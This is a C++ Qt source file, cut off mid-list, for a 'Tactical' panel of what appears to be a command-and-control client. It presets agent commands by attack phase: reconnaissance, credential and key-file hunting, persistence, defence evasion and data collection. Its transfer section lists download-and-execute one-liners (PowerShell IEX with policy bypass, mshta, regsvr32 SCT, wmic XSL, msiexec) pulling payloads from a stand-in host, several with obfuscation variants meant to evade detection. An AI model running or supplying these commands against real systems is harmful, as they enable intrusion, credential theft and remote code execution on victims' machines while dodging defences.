#include <UI/Widgets/TacticalWidget.h>
#include <UI/Widgets/AdaptixWidget.h>
#include <UI/Widgets/ConsoleWidget.h>
#include <Agent/Agent.h>
#include <QVBoxLayout>
#include <QHBoxLayout>
#include <QHeaderView>
#include <QMessageBox>
#include <QDateTime>
#include <QMenu>
#include <QInputDialog>
#include <QDir>
#include <QFile>
#include <QJsonDocument>
#include <QJsonArray>
#include <QJsonObject>
#include <QApplication>
#include <QClipboard>
#include <QDialog>
#include <QDialogButtonBox>
#include <QListWidget>
#include <QTableWidget>
#include <QRadioButton>
#include <QButtonGroup>
#include <QSpinBox>
#include <QGroupBox>
#include <QFrame>
#include <UI/Widgets/TasksWidget.h>
#include <Client/AuthProfile.h>

TacticalWidget::TacticalWidget(AdaptixWidget* w)
    : DockTab("Tactical", w->GetProfile()->GetProject(), ":/icons/start"), adaptixWidget(w)
{
    // 初始化用户命令文件路径
    QString configDir = QDir::homePath() + "/.adaptix";
    QDir().mkpath(configDir);
    userCommandsFile = configDir + "/tactical_commands.json";
    commandModsFile = configDir + "/tactical_mods.json";
    historyFile = configDir + "/tactical_history.json";
    queuesFile = configDir + "/tactical_queues.json";
    
    createUI();
    loadUserCommands();
    loadCommandMods();
    loadPhases();
    loadHistory();
    loadQueues();
    
    executeTimer = new QTimer(this);
    executeTimer->setInterval(500);
    connect(executeTimer, &QTimer::timeout, this, &TacticalWidget::processNextCommand);
    
    this->dockWidget->setWidget(this);
}

void TacticalWidget::createUI()
{
    auto mainLayout = new QVBoxLayout(this);
    mainLayout->setContentsMargins(8, 8, 8, 8);
    mainLayout->setSpacing(8);
    
    // 顶部：Agent 选择区域（带分组框）
    auto topGroup = new QGroupBox("🎯 目标选择", this);
    topGroup->setStyleSheet(R"(
        QGroupBox {
            font-weight: bold;
            border: 1px solid #3c3c3c;
            border-radius: 4px;
            margin-top: 8px;
            padding-top: 8px;
        }
        QGroupBox::title {
            subcontrol-origin: margin;
            left: 10px;
            padding: 0 5px;
        }
    )");
    auto topLayout = new QHBoxLayout(topGroup);
    topLayout->setContentsMargins(8, 4, 8, 8);
    
    auto singleLabel = new QLabel("单目标:", this);
    agentCombo = new QComboBox(this);
    agentCombo->setMinimumWidth(200);
    agentCombo->setStyleSheet("QComboBox { padding: 4px; }");
    connect(agentCombo, QOverload<int>::of(&QComboBox::currentIndexChanged), 
            this, &TacticalWidget::onAgentChanged);
    
    refreshButton = new QPushButton("🔄", this);
    refreshButton->setToolTip("刷新 Agent 列表");
    refreshButton->setMaximumWidth(32);
    connect(refreshButton, &QPushButton::clicked, this, &TacticalWidget::onRefreshAgents);
    
    auto separator = new QFrame(this);
    separator->setFrameShape(QFrame::VLine);
    separator->setStyleSheet("color: #3c3c3c;");
    
    multiAgentBtn = new QPushButton("📋 多目标", this);
    multiAgentBtn->setToolTip("选择多个 Agent 批量执行（与单目标互斥）");
    multiAgentBtn->setMinimumWidth(90);
    connect(multiAgentBtn, &QPushButton::clicked, this, &TacticalWidget::onMultiAgentSelect);
    
    topLayout->addWidget(singleLabel);
    topLayout->addWidget(agentCombo, 1);
    topLayout->addWidget(refreshButton);
    topLayout->addWidget(separator);
    topLayout->addWidget(multiAgentBtn);
    
    // 主分割器：左侧命令树 + 右侧结果预览
    mainSplitter = new QSplitter(Qt::Horizontal, this);
    
    // 左侧：战术阶段标签页
    phaseTab = new QTabWidget(this);
    phaseTab->setDocumentMode(true);
    
    // 右侧：结果预览面板
    auto resultPanel = new QWidget(this);
    auto resultLayout = new QVBoxLayout(resultPanel);
    resultLayout->setContentsMargins(0, 0, 0, 0);
    resultLayout->setSpacing(4);
    
    auto resultHeaderLayout = new QHBoxLayout();
    resultTitleLabel = new QLabel("执行结果", this);
    resultTitleLabel->setStyleSheet("font-weight: bold; color: #888;");
    
    clearResultBtn = new QPushButton("清空", this);
    clearResultBtn->setMaximumWidth(50);
    connect(clearResultBtn, &QPushButton::clicked, [this]() { resultTree->clear(); });
    
    auto viewTasksBtn = new QPushButton("📋 查看任务", this);
    viewTasksBtn->setToolTip("打开历史任务面板查看完整输出");
    connect(viewTasksBtn, &QPushButton::clicked, [this]() {
        if (!currentAgentId.isEmpty() && adaptixWidget->TasksDock) {
            adaptixWidget->TasksDock->SetAgentFilter(currentAgentId);
            adaptixWidget->LoadTasksOutput();
        }
    });
    
    resultHeaderLayout->addWidget(resultTitleLabel);
    resultHeaderLayout->addStretch();
    resultHeaderLayout->addWidget(viewTasksBtn);
    resultHeaderLayout->addWidget(clearResultBtn);
    
    // 任务列表样式的结果显示
    resultTree = new QTreeWidget(this);
    resultTree->setHeaderLabels({"命令", "状态", "时间"});
    resultTree->setColumnCount(3);
    resultTree->setRootIsDecorated(true);
    resultTree->setAlternatingRowColors(true);
    resultTree->setStyleSheet(R"(
        QTreeWidget {
            background-color: #1e1e1e;
            color: #d4d4d4;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            border: 1px solid #3c3c3c;
        }
        QTreeWidget::item {
            padding: 4px;
        }
        QTreeWidget::item:selected {
            background-color: #264f78;
        }
    )");
    resultTree->setColumnWidth(0, 250);
    resultTree->setColumnWidth(1, 60);
    resultTree->setColumnWidth(2, 80);
    
    // 双击跳转到 Tasks 查看详情
    connect(resultTree, &QTreeWidget::itemDoubleClicked, [this](QTreeWidgetItem* item, int) {
        // 获取 taskId 和 agentId
        QString taskId = item->data(0, Qt::UserRole + 1).toString();
        QString agentId = item->data(0, Qt::UserRole).toString();
        
        // 如果是父项，展开/折叠
        if (item->childCount() > 0 && taskId.isEmpty()) {
            item->setExpanded(!item->isExpanded());
            return;
        }
        
        // 跳转到 Tasks 面板
        if (!taskId.isEmpty() && adaptixWidget->TasksDock) {
            adaptixWidget->SetTasksUI();
            adaptixWidget->TasksDock->SetAgentFilter(agentId);
            adaptixWidget->TasksDock->SelectTask(taskId);
            statusLabel->setText("已跳转到任务详情");
        }
    });
    
    resultLayout->addLayout(resultHeaderLayout);
    resultLayout->addWidget(resultTree, 1);
    
    // 中间：任务编排队列面板（支持多套队列）
    auto queuePanel = new QWidget(this);
    auto queueLayout = new QVBoxLayout(queuePanel);
    queueLayout->setContentsMargins(0, 0, 0, 0);
    queueLayout->setSpacing(4);
    
    // 队列选择器行
    auto queueHeaderLayout = new QHBoxLayout();
    auto queueTitleLabel = new QLabel("📋", this);
    
    queueSelector = new QComboBox(this);
    queueSelector->setMinimumWidth(100);
    queueSelector->addItem("默认队列");
    queueSelector->setToolTip("选择任务队列");
    connect(queueSelector, QOverload<int>::of(&QComboBox::currentIndexChanged), 
            this, &TacticalWidget::onQueueChanged);
    
    addQueueBtn = new QPushButton("+", this);
    addQueueBtn->setToolTip("新建队列");
    addQueueBtn->setMaximumWidth(24);
    addQueueBtn->setStyleSheet("font-weight: bold;");
    connect(addQueueBtn, &QPushButton::clicked, this, &TacticalWidget::onAddQueue);
    
    deleteQueueBtn = new QPushButton("×", this);
    deleteQueueBtn->setToolTip("删除当前队列");
    deleteQueueBtn->setMaximumWidth(24);
    deleteQueueBtn->setStyleSheet("font-weight: bold; color: #f44747;");
    connect(deleteQueueBtn, &QPushButton::clicked, this, &TacticalWidget::onDeleteQueue);
    
    queueStatusLabel = new QLabel("0 个任务", this);
    queueStatusLabel->setStyleSheet("color: #888;");
    
    queueHeaderLayout->addWidget(queueTitleLabel);
    queueHeaderLayout->addWidget(queueSelector, 1);
    queueHeaderLayout->addWidget(addQueueBtn);
    queueHeaderLayout->addWidget(deleteQueueBtn);
    queueHeaderLayout->addWidget(queueStatusLabel);
    
    // 任务队列列表
    taskQueueList = new QListWidget(this);
    taskQueueList->setDragDropMode(QAbstractItemView::InternalMove);
    taskQueueList->setSelectionMode(QAbstractItemView::ExtendedSelection);
    taskQueueList->setAlternatingRowColors(true);
    taskQueueList->setStyleSheet(R"(
        QListWidget {
            background-color: #252526;
            color: #d4d4d4;
            font-family: 'Consolas', 'Monaco', monospace;
            font-size: 12px;
            border: 1px solid #3c3c3c;
        }
        QListWidget::item {
            padding: 6px;
            border-bottom: 1px solid #3c3c3c;
        }
        QListWidget::item:selected {
            background-color: #094771;
        }
    )");
    connect(taskQueueList->model(), &QAbstractItemModel::rowsMoved, [this]() {
        syncUIToQueue();
        queueStatusLabel->setText(QString("%1 个任务").arg(taskQueueList->count()));
    });
    
    // 所有控制按钮合并到一行
    auto queueBtnLayout = new QHBoxLayout();
    queueBtnLayout->setSpacing(2);
    
    addToQueueBtn = new QPushButton("➕", this);
    addToQueueBtn->setToolTip("添加选中命令到当前队列");
    addToQueueBtn->setMaximumWidth(28);
    connect(addToQueueBtn, &QPushButton::clicked, this, &TacticalWidget::onAddToQueue);
    
    removeFromQueueBtn = new QPushButton("➖", this);
    removeFromQueueBtn->setToolTip("从队列移除");
    removeFromQueueBtn->setMaximumWidth(28);
    connect(removeFromQueueBtn, &QPushButton::clicked, this, &TacticalWidget::onRemoveFromQueue);
    
    moveUpBtn = new QPushButton("↑", this);
    moveUpBtn->setToolTip("上移");
    moveUpBtn->setMaximumWidth(24);
    connect(moveUpBtn, &QPushButton::clicked, this, &TacticalWidget::onMoveQueueUp);
    
    moveDownBtn = new QPushButton("↓", this);
    moveDownBtn->setToolTip("下移");
    moveDownBtn->setMaximumWidth(24);
    connect(moveDownBtn, &QPushButton::clicked, this, &TacticalWidget::onMoveQueueDown);
    
    clearQueueBtn = new QPushButton("🗑", this);
    clearQueueBtn->setToolTip("清空队列");
    clearQueueBtn->setMaximumWidth(28);
    connect(clearQueueBtn, &QPushButton::clicked, this, &TacticalWidget::onClearQueue);
    
    auto btnSeparator = new QFrame(this);
    btnSeparator->setFrameShape(QFrame::VLine);
    btnSeparator->setStyleSheet("color: #3c3c3c;");
    
    auto delayLabel = new QLabel("间隔:", this);
    delaySpinBox = new QSpinBox(this);
    delaySpinBox->setRange(0, 60);
    delaySpinBox->setValue(2);
    delaySpinBox->setSuffix("s");
    delaySpinBox->setToolTip("命令间执行间隔(秒)");
    delaySpinBox->setMaximumWidth(55);
    
    runQueueBtn = new QPushButton("▶ 执行", this);
    runQueueBtn->setStyleSheet("background-color: #0e639c; color: white; padding: 3px 8px;");
    runQueueBtn->setToolTip("顺序执行队列中的命令");
    connect(runQueueBtn, &QPushButton::clicked, this, &TacticalWidget::onRunQueue);
    
    queueBtnLayout->addWidget(addToQueueBtn);
    queueBtnLayout->addWidget(removeFromQueueBtn);
    queueBtnLayout->addWidget(moveUpBtn);
    queueBtnLayout->addWidget(moveDownBtn);
    queueBtnLayout->addWidget(clearQueueBtn);
    queueBtnLayout->addWidget(btnSeparator);
    queueBtnLayout->addWidget(delayLabel);
    queueBtnLayout->addWidget(delaySpinBox);
    queueBtnLayout->addWidget(runQueueBtn);
    
    queueLayout->addLayout(queueHeaderLayout);
    queueLayout->addWidget(taskQueueList, 1);
    queueLayout->addLayout(queueBtnLayout);
    
    // 初始化默认队列
    currentQueueName = "默认队列";
    taskQueues[currentQueueName] = QList<QPair<QString, QString>>();
    
    mainSplitter->addWidget(phaseTab);
    mainSplitter->addWidget(queuePanel);
    mainSplitter->addWidget(resultPanel);
    mainSplitter->setStretchFactor(0, 3);
    mainSplitter->setStretchFactor(1, 2);
    mainSplitter->setStretchFactor(2, 2);
    
    // 底部：操作按钮和进度（简化布局）
    auto bottomLayout = new QHBoxLayout();
    bottomLayout->setSpacing(8);
    
    executeSelectedBtn = new QPushButton("▶ 执行选中", this);
    executeSelectedBtn->setStyleSheet("QPushButton { background-color: #0e639c; color: white; padding: 6px 16px; border-radius: 3px; font-weight: bold; } QPushButton:hover { background-color: #1177bb; }");
    connect(executeSelectedBtn, &QPushButton::clicked, this, &TacticalWidget::onExecuteSelected);
    
    progressBar = new QProgressBar(this);
    progressBar->setVisible(false);
    progressBar->setTextVisible(true);
    progressBar->setMinimumWidth(150);
    progressBar->setStyleSheet("QProgressBar { border: 1px solid #3c3c3c; border-radius: 3px; text-align: center; } QProgressBar::chunk { background-color: #0e639c; }");
    
    statusLabel = new QLabel("请选择目标 Agent", this);
    statusLabel->setStyleSheet("color: #888; padding: 4px 8px; background: #252526; border-radius: 3px;");
    statusLabel->setMinimumWidth(200);
    
    bottomLayout->addWidget(executeSelectedBtn);
    bottomLayout->addWidget(progressBar);
    bottomLayout->addStretch();
    bottomLayout->addWidget(statusLabel);
    
    mainLayout->addWidget(topGroup);
    mainLayout->addWidget(mainSplitter, 1);
    mainLayout->addLayout(bottomLayout);
    
    // 刷新 Agent 列表
    onRefreshAgents();
}

void TacticalWidget::loadPhases()
{
    phases.clear();
    
    if (currentAgentOs == "linux") {
        loadLinuxPhases();
    } else {
        loadWindowsPhases();
    }
    
    // 将用户自定义命令添加到对应的阶段和分组
    for (const TacticalCommand& userCmd : userCommands) {
        bool added = false;
        
        // 查找匹配的阶段和分组
        for (int i = 0; i < phases.size(); ++i) {
            if (phases[i].id == userCmd.phaseId || userCmd.phaseId.isEmpty()) {
                for (int j = 0; j < phases[i].groups.size(); ++j) {
                    if (phases[i].groups[j].id == userCmd.groupId || 
                        (userCmd.groupId.isEmpty() && j == 0)) {
                        phases[i].groups[j].commands.append(userCmd);
                        added = true;
                        break;
                    }
                }
                if (added) break;
            }
        }
        
        // 如果没有找到匹配的分组，添加到第一个阶段的第一个分组
        if (!added && !phases.isEmpty() && !phases[0].groups.isEmpty()) {
            phases[0].groups[0].commands.append(userCmd);
        }
    }
    
    updatePhaseTree();
}

void TacticalWidget::loadWindowsPhases()
{
    // Phase 1: 侦察
    TacticalPhase recon;
    recon.id = "recon";
    recon.name = "🔍 侦察";
    recon.icon = "search";
    recon.description = "收集目标系统信息";
    
    TacticalGroup reconBasic;
    reconBasic.id = "basic";
    reconBasic.name = "基础信息";
    reconBasic.commands = {
        {"whoami", "当前用户", "whoami /all", "查看当前用户身份和权限组", 0, ""},
        {"hostname", "主机名", "hostname", "获取计算机名称", 0, ""},
        {"ipconfig", "网络配置", "ipconfig /all", "查看网络接口配置", 0, ""},
        {"systeminfo", "系统信息", "systeminfo", "获取操作系统详细信息", 0, ""}
    };
    
    TacticalGroup reconNetwork;
    reconNetwork.id = "network";
    reconNetwork.name = "网络环境";
    reconNetwork.commands = {
        {"arp", "ARP 缓存", "arp -a", "查看 ARP 表获取相邻主机", 0, ""},
        {"route", "路由表", "route print", "查看路由表了解网络拓扑", 0, ""},
        {"netstat", "网络连接", "netstat -ano", "查看网络连接和监听端口", 0, ""},
        {"dns", "DNS 缓存", "ipconfig /displaydns", "查看 DNS 缓存获取访问记录", 0, ""}
    };
    
    TacticalGroup reconDomain;
    reconDomain.id = "domain";
    reconDomain.name = "域环境";
    reconDomain.commands = {
        {"nltest", "域控列表", "nltest /dclist:", "枚举域控制器", 0, ""},
        {"netdom", "域信息", "net config workstation", "查看域成员信息", 0, ""},
        {"domainadmins", "域管理员", "net group \"Domain Admins\" /domain", "枚举域管理员", 0, ""},
        {"domainusers", "域用户", "net user /domain", "枚举域用户", 0, ""}
    };
    
    recon.groups = {reconBasic, reconNetwork, reconDomain};
    phases.append(recon);
    
    // Phase 2: 权限提升
    TacticalPhase privesc;
    privesc.id = "privesc";
    privesc.name = "🔓 提权";
    privesc.icon = "unlock";
    privesc.description = "检查并尝试提升权限";
    
    TacticalGroup privCheck;
    privCheck.id = "check";
    privCheck.name = "权限检查";
    privCheck.commands = {
        {"priv", "当前权限", "whoami /priv", "查看当前 Token 权限", 0, ""},
        {"groups", "用户组", "whoami /groups", "查看所属用户组", 0, ""},
        {"localadmin", "本地管理员", "net localgroup administrators", "查看本地管理员组成员", 0, ""}
    };
    
    TacticalGroup privUac;
    privUac.id = "uac";
    privUac.name = "UAC 检查";
    privUac.commands = {
        {"uacstatus", "UAC 状态", "REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v EnableLUA", "检查 UAC 是否启用", 0, ""},
        {"uaclevel", "UAC 级别", "REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System /v ConsentPromptBehaviorAdmin", "检查 UAC 提示级别", 0, ""}
    };
    
    TacticalGroup privService;
    privService.id = "service";
    privService.name = "服务枚举";
    privService.commands = {
        {"services", "服务列表", "sc query state= all", "枚举所有服务", 0, ""},
        {"unquoted", "未引用路径", "wmic service get name,displayname,pathname,startmode | findstr /i /v \"C:\\Windows\\\\\"", "查找未引用服务路径", 0, ""}
    };
    
    privesc.groups = {privCheck, privUac, privService};
    phases.append(privesc);
    
    // Phase 3: 凭据收集
    TacticalPhase creds;
    creds.id = "creds";
    creds.name = "🔑 凭据";
    creds.icon = "key";
    creds.description = "收集凭据和敏感信息";
    
    TacticalGroup credsEnum;
    credsEnum.id = "enum";
    credsEnum.name = "凭据枚举";
    credsEnum.commands = {
        {"cmdkey", "保存的凭据", "cmdkey /list", "列出保存的凭据", 0, ""},
        {"vault", "凭据保管库", "vaultcmd /listcreds:\"Windows Credentials\"", "查看 Windows 凭据保管库", 0, ""}
    };
    
    TacticalGroup credsFiles;
    credsFiles.id = "files";
    credsFiles.name = "敏感文件";
    credsFiles.commands = {
        {"unattend", "无人值守", "dir /s /b C:\\*unattend*.xml C:\\*sysprep*.xml 2>nul", "查找无人值守安装文件", 0, ""},
        {"passwords", "密码文件", "dir /s /b C:\\*pass*.txt C:\\*cred*.txt 2>nul", "查找可能包含密码的文件", 0, ""}
    };
    
    creds.groups = {credsEnum, credsFiles};
    phases.append(creds);
    
    // Phase 4: 横向移动
    TacticalPhase lateral;
    lateral.id = "lateral";
    lateral.name = "➡️ 横向";
    lateral.icon = "arrow-right";
    lateral.description = "网络扫描和横向移动准备";
    
    TacticalGroup lateralEnum;
    lateralEnum.id = "enum";
    lateralEnum.name = "网络枚举";
    lateralEnum.commands = {
        {"netview", "网络邻居", "net view", "枚举网络邻居", 0, ""},
        {"netviewdomain", "域计算机", "net view /domain", "枚举域中的计算机", 0, ""},
        {"shares", "共享资源", "net share", "查看本地共享", 0, ""}
    };
    
    TacticalGroup lateralAdmin;
    lateralAdmin.id = "admin";
    lateralAdmin.name = "管理共享";
    lateralAdmin.commands = {
        {"adminsearch", "管理员共享", "dir \\\\127.0.0.1\\c$", "测试本地管理员共享访问", 0, ""}
    };
    
    lateral.groups = {lateralEnum, lateralAdmin};
    phases.append(lateral);
    
    // Phase 5: 持久化
    TacticalPhase persist;
    persist.id = "persist";
    persist.name = "📌 持久化";
    persist.icon = "pin";
    persist.description = "建立持久访问机制";
    
    TacticalGroup persistCheck;
    persistCheck.id = "check";
    persistCheck.name = "持久化检查";
    persistCheck.commands = {
        {"schtasks", "计划任务", "schtasks /query /fo LIST /v", "列出所有计划任务", 0, ""},
        {"startup", "启动项", "REG QUERY HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "查看系统启动项", 0, ""},
        {"startupuser", "用户启动项", "REG QUERY HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", "查看用户启动项", 0, ""},
        {"services", "服务列表", "sc query type= all state= all", "列出所有服务", 0, ""}
    };
    
    TacticalGroup persistLocations;
    persistLocations.id = "locations";
    persistLocations.name = "常见位置";
    persistLocations.commands = {
        {"startupfolder", "启动文件夹", "dir \"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\"", "查看用户启动文件夹", 0, ""},
        {"allusers", "公共启动", "dir \"C:\\ProgramData\\Microsoft\\Windows\\Start Menu\\Programs\\StartUp\"", "查看公共启动文件夹", 0, ""},
        {"winlogon", "Winlogon", "REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\Windows NT\\CurrentVersion\\Winlogon\" /v Shell", "检查 Winlogon Shell", 0, ""}
    };
    
    persist.groups = {persistCheck, persistLocations};
    phases.append(persist);
    
    // Phase 6: 防御规避
    TacticalPhase evasion;
    evasion.id = "evasion";
    evasion.name = "🛡️ 规避";
    evasion.icon = "shield";
    evasion.description = "检测和规避安全防护";
    
    TacticalGroup evasionAv;
    evasionAv.id = "av";
    evasionAv.name = "安全软件";
    evasionAv.commands = {
        {"defender", "Defender状态", "sc query windefend", "检查 Windows Defender 服务状态", 0, ""},
        {"defenderexcl", "Defender排除", "REG QUERY \"HKLM\\SOFTWARE\\Microsoft\\Windows Defender\\Exclusions\\Paths\"", "查看 Defender 排除路径", 0, ""},
        {"avproduct", "安全产品", "wmic /namespace:\\\\root\\SecurityCenter2 path AntiVirusProduct get displayName,productState", "枚举已安装的安全产品", 0, ""},
        {"firewall", "防火墙状态", "netsh advfirewall show allprofiles state", "查看防火墙状态", 0, ""}
    };
    
    TacticalGroup evasionLogs;
    evasionLogs.id = "logs";
    evasionLogs.name = "日志审计";
    evasionLogs.commands = {
        {"auditpol", "审计策略", "auditpol /get /category:*", "查看审计策略配置", 0, ""},
        {"eventlog", "事件日志", "wevtutil el", "列出所有事件日志", 0, ""},
        {"pslog", "PowerShell日志", "REG QUERY \"HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging\"", "检查 PowerShell 日志设置", 0, ""}
    };
    
    evasion.groups = {evasionAv, evasionLogs};
    phases.append(evasion);
    
    // Phase 7: 数据收集
    TacticalPhase collection;
    collection.id = "collection";
    collection.name = "📦 收集";
    collection.icon = "package";
    collection.description = "收集目标数据和文件";
    
    TacticalGroup collectionFiles;
    collectionFiles.id = "files";
    collectionFiles.name = "文件搜索";
    collectionFiles.commands = {
        {"docfiles", "文档文件", "dir /s /b C:\\Users\\*.docx C:\\Users\\*.xlsx C:\\Users\\*.pdf 2>nul | findstr /i /v AppData", "搜索用户文档", 0, ""},
        {"configfiles", "配置文件", "dir /s /b C:\\Users\\*.config C:\\Users\\*.ini C:\\Users\\*.xml 2>nul | findstr /i /v AppData", "搜索配置文件", 0, ""},
        {"keyfiles", "密钥文件", "dir /s /b C:\\Users\\*.pem C:\\Users\\*.key C:\\Users\\*.pfx C:\\Users\\*.p12 2>nul", "搜索密钥文件", 0, ""},
        {"recent", "最近文件", "dir \"%APPDATA%\\Microsoft\\Windows\\Recent\"", "查看最近访问的文件", 0, ""}
    };
    
    TacticalGroup collectionBrowser;
    collectionBrowser.id = "browser";
    collectionBrowser.name = "浏览器数据";
    collectionBrowser.commands = {
        {"chrome", "Chrome数据", "dir \"%LOCALAPPDATA%\\Google\\Chrome\\User Data\\Default\"", "查看 Chrome 用户数据目录", 0, ""},
        {"edge", "Edge数据", "dir \"%LOCALAPPDATA%\\Microsoft\\Edge\\User Data\\Default\"", "查看 Edge 用户数据目录", 0, ""},
        {"firefox", "Firefox数据", "dir \"%APPDATA%\\Mozilla\\Firefox\\Profiles\"", "查看 Firefox 配置目录", 0, ""}
    };
    
    collection.groups = {collectionFiles, collectionBrowser};
    phases.append(collection);
    
    // Phase 8: 文件传输 (带多版本命令示例)
    TacticalPhase transfer;
    transfer.id = "transfer";
    transfer.name = "📥 传输";
    transfer.icon = "download";
    transfer.description = "文件下载和传输工具";
    
    TacticalGroup transferDownload;
    transferDownload.id = "download";
    transferDownload.name = "下载工具";
    
    // certutil 命令 - 多版本
    TacticalCommand certutilCmd;
    certutilCmd.id = "certutil";
    certutilCmd.name = "CertUtil下载";
    certutilCmd.cmd = "certutil -urlcache -split -f http://example.com/file.exe C:\\Windows\\Temp\\file.exe";
    certutilCmd.description = "使用 CertUtil 下载文件";
    certutilCmd.variants = {
        {"standard", "certutil -urlcache -split -f http://example.com/file.exe C:\\Windows\\Temp\\file.exe", "标准命令"},
        {"obfuscated", "certutil -url\"\"cache -split -f http://example.com/file.exe C:\\Windows\\Temp\\file.exe", "参数混淆"},
        {"env_obfs", "c^e^r^t^u^t^i^l -urlcache -split -f http://example.com/file.exe C:\\Windows\\Temp\\file.exe", "字符插入"},
        {"base64", "certutil -encode C:\\Windows\\Temp\\file.exe C:\\Windows\\Temp\\file.b64", "Base64编码"}
    };
    
    // bitsadmin 命令 - 多版本
    TacticalCommand bitsCmd;
    bitsCmd.id = "bitsadmin";
    bitsCmd.name = "BitsAdmin下载";
    bitsCmd.cmd = "bitsadmin /transfer job /download /priority high http://example.com/file.exe C:\\Windows\\Temp\\file.exe";
    bitsCmd.description = "使用 BitsAdmin 下载文件";
    bitsCmd.variants = {
        {"standard", "bitsadmin /transfer job /download /priority high http://example.com/file.exe C:\\Windows\\Temp\\file.exe", "标准命令"},
        {"obfuscated", "bitsadmin /transfer job /down^load /priority high http://example.com/file.exe C:\\Windows\\Temp\\file.exe", "参数混淆"},
        {"rawpipe", "bitsadmin /rawreturn /transfer job http://example.com/file.exe C:\\Windows\\Temp\\file.exe", "RawReturn模式"}
    };
    
    // PowerShell 下载 - 多版本
    TacticalCommand psDownloadCmd;
    psDownloadCmd.id = "psdownload";
    psDownloadCmd.name = "PowerShell下载";
    psDownloadCmd.cmd = "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://example.com/file.exe','C:\\Windows\\Temp\\file.exe')\"";
    psDownloadCmd.description = "使用 PowerShell 下载文件";
    psDownloadCmd.variants = {
        {"webclient", "powershell -c \"(New-Object Net.WebClient).DownloadFile('http://example.com/file.exe','C:\\Windows\\Temp\\file.exe')\"", "WebClient"},
        {"iwr", "powershell -c \"Invoke-WebRequest -Uri 'http://example.com/file.exe' -OutFile 'C:\\Windows\\Temp\\file.exe'\"", "Invoke-WebRequest"},
        {"bitstransfer", "powershell -c \"Import-Module BitsTransfer; Start-BitsTransfer -Source 'http://example.com/file.exe' -Destination 'C:\\Windows\\Temp\\file.exe'\"", "BITS模块"},
        {"encoded", "powershell -enc <BASE64_ENCODED_COMMAND>", "Base64编码"},
        {"bypass", "powershell -ep bypass -nop -c \"IEX(New-Object Net.WebClient).DownloadString('http://example.com/script.ps1')\"", "执行策略绕过"}
    };
    
    // mshta 命令 - 多版本
    TacticalCommand mshtaCmd;
    mshtaCmd.id = "mshta";
    mshtaCmd.name = "Mshta执行";
    mshtaCmd.cmd = "mshta http://example.com/payload.hta";
    mshtaCmd.description = "使用 mshta.exe 执行远程 HTA";
    mshtaCmd.variants = {
        {"standard", "mshta http://example.com/payload.hta", "标准远程执行"},
        {"vbscript", "mshta vbscript:Execute(\"CreateObject(\"\"Wscript.Shell\"\").Run \"\"calc\"\", 0:close\")", "VBScript内联"},
        {"javascript", "mshta javascript:a=GetObject(\"script:http://example.com/payload.sct\").Exec():close", "JavaScript SCT"},
        {"path_traversal", "mshta c:\\windows\\system32\\..\\temp\\payload.hta", "路径遍历绕过"}
    };
    
    // msiexec 命令 - 多版本
    TacticalCommand msiexecCmd;
    msiexecCmd.id = "msiexec";
    msiexecCmd.name = "Msiexec下载";
    msiexecCmd.cmd = "msiexec /q /i http://example.com/payload.msi";
    msiexecCmd.description = "使用 msiexec.exe 下载执行";
    msiexecCmd.variants = {
        {"standard", "msiexec /q /i http://example.com/payload.msi", "标准安装"},
        {"backslash", "msiexec /q /i https:\\\\example.com/payload.msi", "反斜杠URL绕过"},
        {"dll", "msiexec /y C:\\path\\to\\payload.dll", "DLL注册"},
        {"quiet", "msiexec /quiet /i http://example.com/payload.msi", "静默安装"}
    };
    
    // regsvr32 命令 - 多版本
    TacticalCommand regsvr32Cmd;
    regsvr32Cmd.id = "regsvr32";
    regsvr32Cmd.name = "Regsvr32执行";
    regsvr32Cmd.cmd = "regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll";
    regsvr32Cmd.description = "使用 regsvr32.exe 执行 SCT";
    regsvr32Cmd.variants = {
        {"standard", "regsvr32 /s /n /u /i:http://example.com/payload.sct scrobj.dll", "标准SCT执行"},
        {"local", "regsvr32 /s C:\\path\\to\\payload.dll", "本地DLL注册"},
        {"silent", "regsvr32 /s /n /u /i:\\\\webdav\\payload.sct scrobj.dll", "WebDAV加载"}
    };
    
    // rundll32 命令 - 多版本
    TacticalCommand rundll32Cmd;
    rundll32Cmd.id = "rundll32";
    rundll32Cmd.name = "Rundll32执行";
    rundll32Cmd.cmd = "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")";
    rundll32Cmd.description = "使用 rundll32.exe 执行代码";
    rundll32Cmd.variants = {
        {"javascript", "rundll32.exe javascript:\"\\..\\mshtml,RunHTMLApplication\";document.write();h=new%20ActiveXObject(\"WScript.Shell\").Run(\"calc\")", "JavaScript执行"},
        {"dll_export", "rundll32.exe shell32.dll,Control_RunDLL payload.dll", "DLL导出函数"},
        {"url_dll", "rundll32.exe url.dll,OpenURL http://example.com/payload.hta", "URL.dll打开"},
        {"advpack", "rundll32.exe advpack.dll,LaunchINFSection payload.inf,DefaultInstall_SingleUser,1,", "INF安装"}
    };
    
    // wmic 命令 - 多版本
    TacticalCommand wmicCmd;
    wmicCmd.id = "wmic";
    wmicCmd.name = "WMIC执行";
    wmicCmd.cmd = "wmic process call create \"powershell -ep bypass -c IEX(curl http://example.com/payload.ps1)\"";
    wmicCmd.description = "使用 WMIC 创建进程";
    wmicCmd.variants = {
        {"process_create", "wmic process call create \"powershell -ep bypass -c IEX(curl http://example.com/payload.ps1)\"", "创建进程"},
        {"xsl", "wmic os get /format:\"http://example.com/payload.xsl\"", "XSL远程执行"},
        {"product", "wmic product call install PackageLocation=http://example.com/payload.msi", "MSI安装"},
        {"format_local", "wmic os get /format:\"C:\\path\\to\\payload.xsl\"", "本地XSL"}
    };
    
    transferDownload.commands = {certutilCmd, bitsCmd, psDownloadCmd, mshtaCmd, msiexecCmd, regsvr32Cmd, rundll32Cmd, wmicCmd};
    
    TacticalGroup transferUpload;
    transferUpload.id = "upload";
    transferUpload.name = "上传工具";
    transferUpload.commands = {
        {"ftp", "FTP上传", "ftp -s:commands.txt", "使用 FTP 脚本上传", 0, ""},
